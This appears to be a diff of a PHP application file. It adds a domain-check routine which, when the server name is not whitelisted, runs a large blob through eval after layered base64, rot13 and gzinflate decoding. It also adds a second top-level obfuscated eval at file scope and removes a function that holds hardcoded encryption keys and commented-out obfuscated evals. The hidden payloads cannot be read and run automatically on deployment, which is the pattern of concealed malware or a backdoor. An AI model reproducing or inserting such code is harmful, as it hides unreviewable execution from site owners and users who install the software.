+
+    dCDIK($pai[7], $pai[6]);
+
+
+    $sName = $_SERVER['SERVER_NAME'];
+
+    if (php_sapi_name() !== 'cli') {
+
+        foreach (IID as $key => $value) {
+            if ($key !== base64_decode('aWQ=')) {
+                if (filter_var($sName, FILTER_VALIDATE_IP) || $sName === base64_decode('bG9jYWxob3N0') || $sName === '127.0.0.1' || $sName === '::1') {
+                    return true;
+                } else {
+                    if ($key === base64_decode('ZG9tYWlu')) {
+                        if ($value[0] == $sName || $value[1] == $sName) {
+                            return true;
+                        } else {
+                            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+
+                            return false;
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
+
+function _6964($key, $value) {}
+function _6c6f63616c686f7374($key, $value) {}
+function _6970($key, $value) {}
+function _646f6d61696e($key, $value) {}
 
 function loadCkPathsFiles()
 {
@@ -775,23 +805,4 @@ function loadCkPathsFiles()
   }
 }
 
-function dCDIK($cd, $ik)
-{
-  $mensaje = '{"id":"c6aaf4ca-cdb1-4b1f-8b50-740cf05eda6d","localhost":true,"ip":true,"domain":"ionic.urbanroosters.com"}';
-
-
-  $clave = "15u6XzEHYFMchvYoxVFmtCxl9huflYufRHj/g9VVmo4qm0Gk3qE+wJ5sIQEMtaWBGmHTt4dwCOxEyYX5jHg1IeKaq5v2mZ2mEQIhmqlGNfCS7Hj+RrNLDo8FFjRuKYfpKQhu4XRw0OLagXffMnCcqA=="; // Debes usar una clave segura en la práctica
-  // Encriptar
-  $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc"));
-  $mensajeCifrado = openssl_encrypt($mensaje, "aes-256-cbc", $clave, 0, $iv);
-
-  // Descifrar
-  $mensajeDescifrado = openssl_decrypt(axysDecCl($ik), "aes-256-cbc", $clave, 0, $iv);
-  ddd($mensajeCifrado, $mensajeDescifrado, $iv);
-  // // clave
-  // eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
-  // // infinyti_key
-  // eval(str_rot13(gzinflate(str_rot13(base64_decode('
-  // LUnHEoRTDv0al7038kDtiTjknC9b5JwzX+8eeymqk3UhqZ+ebXrG5699OJPtGav1r3YsSgL737LO6bL+SIx6XTz/n/ypdSNclLJhi9wfiBNgz/zaD2IWNDVjHa252ruh8JrICOrKD4K/HZ7NMfiyUbnGXHsw4rWE5beE/QMxrjrZDE8plgEFArihRdANWLvoFyIW8fTQ/JRnKfyU/U15JtnuYz7JtjDVRQPfZZZUg+7qYI/QquGeUG5bVpsN5na7UVOpW3RkEwlkWBMRok1PKmj1zTdr0phYiFqaPW4HK7mcUslqRkb529vBnHT8WtAFzU4S9970M2NER2tJVD0atd21fr5SsWuar5U1zkEYUQp9qasnRgA7jOk6Vx70Bp3YjRVT1rvuSKgjosJfvK4CyavHpLTksndDH1ID/hpWWoyqMxyZBCZoUoc2c3ie1K1lt21EklP1Wi+CoS482ThLUFiZWryfqTlQ85kSxwG7qIyu7CYOfS+rtJuLVk2q5xl6TiSMukrq/Q5WrF/LwKPwfMTHvfmyl6eZnFz4gnK4Ia35zSeJdfvIAqa1HPlXrjZeE5QRPGc9FiEkhM4s9Qr8zEwyfFSYwHVDnABmLgLNx/BHTuwk5O5QdELVlvgKF5QjUgXRg+HOOOqT18SPIhUfhjrvNEZzYZIhV1Zjav5LE/xaKB3aghNJjeORr2gZ7l8gvy/b9F06wfOExERRE+iiEz28SU1ujAWxN2Rf280qnER4NjHBxTOpC9ItFmvVDroS+TDzOxeuFj5RyxEowmoLNKHWdy8WEAgmxQqg37sZU7yke3lBfjiueaQsYXX8S0RiuzepNBlExxTxkyyzRfTsJRSFq9+D8OxdaWFkjnHEutrQBDf3PKVy8ZneQoF+hF6lvpiBo+OpsV4uMGaSxW1HPLiLsgmAXivVF4oFtiqL7z0t+LBoZqANNie0HyuMmWP65ANlAAu1EoOYLMjQdUq2ddBTAfKmlh2uInFvvyhCTyVerYCWutt2Ww6FKiAx7JAX2jUADklZA1cwekjPakBJ0j4+Ja77j8YQYesM44p/E740zNK3BoC5onHxT+7EA9YVseqTTdbvhFUK2ztgoHqntIX1AxhvHthbVaQvi7bPl4z0c62qbaHmK7+7zx8w0t1dc4lIwBi8d2V8Dc0f/jmVWvKaF0VCuD4x54l4YcQRsIyvXB6YEeaYHu/lDGmkBY+96ku4nYdMVYaBNeZUFLt34674o5TDU6hnH2522IRKWrBKlrsSH2BVlLlXwd43qCKnQB+HuNyHHOvi+ylWfqqCEU/aLOQp4pOpI3edtpj54KST1wy9K0Sspr7wiFWtuTqvMUGvvDL2fz0Z4DNt7XOyh1HhmGa71eY8T8UukBBLUVMFdb06WAVHXtxVa9umkRqaMFae78nEoGZJGdn4lNrQx4A6RpJowhfjkPixUUqonEJ0s4bDo8W31D8YHh69nskwQxI181GZjLHikNUBKYgK1yXnTSnOSGIV+RkoHwJKWlj+NfB9FtqaNBbpSAGOHL38Me9eBK0Ck6wfPVzxUFMNUc8HNf1hJSvlIFdayStl4KvVMN/fBlK4UzuvCOr66LhAJ5Zhk2C9LxjbOnjVofpfPqnFYbWA5Y1GpB/XJmUVQnfrupDjhnGi63wKRJ9Tyky2wu9tYguorsKK2SvhBW4J9pj7NJVNc/aXI8ZZ2SCH5FQGtRP19CMGVvoQoS9Ja2ZgrkZothNUEA+Hs0n4EKHBTcuRamfGoS5LsNxNta6+pZkPUt+QF1Yu9PYqMBWyOh8HQedCGB5IK1KJ/ejhM1U4JEoffgSOOBxXuOpAiSojGFtjIwmvzPfuYa4kpI/7pUN2NIGbpe53FE683weF1WoCK1pCtVMqtTlNfYY0kIdoe5i5SEDADi1oQEE4C42CvQ7NIuXjYptPH0mqBJMoL5U6v76hwNW9n4Bkuo9kuJzbvj+QK+scSiWZSuqyJCv401VAk+4F20WkmvyrxkPh3fF2MfIPnuUWKReJH0ip009gTLU/iyznE55+ci2mF3CsTRuv8SE86zd3XxBlS8I9dQHi5j88WW3Y1t6jgxzbBPfsOdvIlQxS0RuZu4dv9RLCwpR3348Cw6Qz2Tm5c8HGf3CZlsTODacBGpN0ALriSXZz1TdwpJruYDiN1thp6YE1nFwIK4Z+JSxnnHm4YaqF9xAaCT5ms+YtsmJAfkotNKl8Kn6oOlIxOI7kVB7YmrW4toF5M8iHNgqfYOtBQka3/B2Dm0F+YXOCH+y/yOhErvno2T14/QgLkEqnkqDPyqsIMnV4+dEKS897CdtKC0OVZifruPLGg06amMOZjobhhlPpsiGv478JuXaKdgAaLfD1nLF6syK4JfnNChxDxR1o+5gLpLpZuaSlZpTiHlBPzFAXnPpRHMdjcOuIhcY005QXvJ9Q/VqeluAywBLDou/7DilBm0A/DvkyX3fnMptq+9JCe07MBEkawXpWhpYqTLmno7vlLmjkkwoLR+BoHZqSqegYLE4JPgINLEYEdTpTbtrHA3enX5vVer1C+n1dZea+GMpdLyvvqaYx26qk1tF4EbqvrA4l3ULht/iVkZFLiXgL2V0HNLq0FGjf2yzWD6ylKBLEr4HzDZDYkhnAkbt+40r51e/f1S/q7kDPtd02ciLDFCsJlsU+rjArJOdUFYfKj4T/hW/3TzNn882+Th/4s3r2ZA8dfwDYgzYlsKudznWQzc/47Y+djWasCb79mfCJf0mtatclEq4hxlDCB5CscKO7ym1OIorEpxNuv+zdBaWexzy9qW5+rOc8TSOTSSsbDR/ujlOoFza+4vfNLfsqMo3lJFTNQj+WEmpULgrg7odIEqP+GTgz8mLfzn+g1p//Ac9//wY=
-  // ')))));
-}
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
